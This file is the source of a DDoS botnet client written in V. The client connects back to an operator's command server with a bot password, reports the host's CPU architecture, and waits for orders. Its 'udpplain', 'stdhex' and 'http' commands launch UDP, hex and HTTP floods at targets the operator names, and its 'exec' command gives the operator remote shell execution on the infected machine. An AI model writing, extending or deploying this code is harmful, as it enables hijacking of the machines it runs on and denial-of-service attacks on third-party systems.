import os
import io
import net
import time

import core.logger

#include "@VROOT/core/methods/udp.c"
#include "@VROOT/core/methods/stdhex.c"
#include "@VROOT/core/methods/http.c"

fn C.udp_bypass(&char, u16, int)
fn C.stdhex(&char, int, int)
fn C.sendHTTP(&char, int)

fn main() {
	mut args := os.args.clone()
	if args.len < 4 {
		logger.conosle_log("invalid_arguments", "arguments provided!\n${args[0]} <ip> <port> <bot_pw>", true)
		exit(0)
	}
	mut s := go server(args[1], args[2], args[3])
	for {
		s.wait()
		s = go server(args[1], args[2], args[3])
	}
}

fn server(ip string, port string, pw string) { 
	mut server := net.dial_tcp("${ip}:${port}") or {
		logger.console_log("hosting_err", "Unable to connect to the server....", true)
		exit(0)
	}

	server.set_read_timeout(time.infinite)

	mut reader := io.new_buffered_reader(reader: server)
	server.write_string("${pw}\n") or { 0 } // Send PW
	time.sleep(1*time.second)

	server.write_string((os.execute("lscpu | grep Architecture").output).replace("Architecture: ", "").trim_space() + "\n") or { 0 } // Send CPU ARCH
	for {
		mut data := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
		fcmd, cmd, args := parse_buffer(data)
		if data.len > 2 {
			match cmd {
				"udpplain" {
					if args.len < 4 {
						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
					} else {
						server.write_string("[ + ] Attack being sent....\n") or { 0 }
						go send_udp(args[1], args[2].u16(), args[3].int())
						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
					}
				}
				"stdhex" {
					if args.len < 4 {
						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
					} else {
						server.write_string("[ + ] Attack being sent....\n") or { 0 }
						go send_std(args[1], args[2].int(), args[3].int())
						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
					}
				}
				"http" {
					if args.len < 3 {
						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
					} else {
						server.write_string("[ + ] Attack being sent....\n") or { 0 }
						go send_http(args[1], args[2].int())
						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
					}
				}
				"exec" {
					server.write_string(os.execute("${data.replace("exec ", "")}").output) or { 0 }
				} else { }
			}
			logger.conosle_log("bot_new_cmd", fcmd, false)
		}
	}
}

fn parse_buffer(buff string) (string, string, []string) {
	mut args := []string{}
	mut cmd := ""
	if buff.contains(" ") {
		args = buff.split(" ")
		cmd = args[0]
	} else {
		args << buff
		cmd = buff
	}
	return buff, cmd, args
}

fn send_udp(ip string, p u16, t int) {
	C.udp_bypass(&char(ip.str), p, t)
}

fn send_std(ip string, p int, t int) {
	C.stdhex(&char(ip.str), p, t)
}

fn send_http(ip string, t int) {
	C.sendHTTP(&char(ip.str), t)
}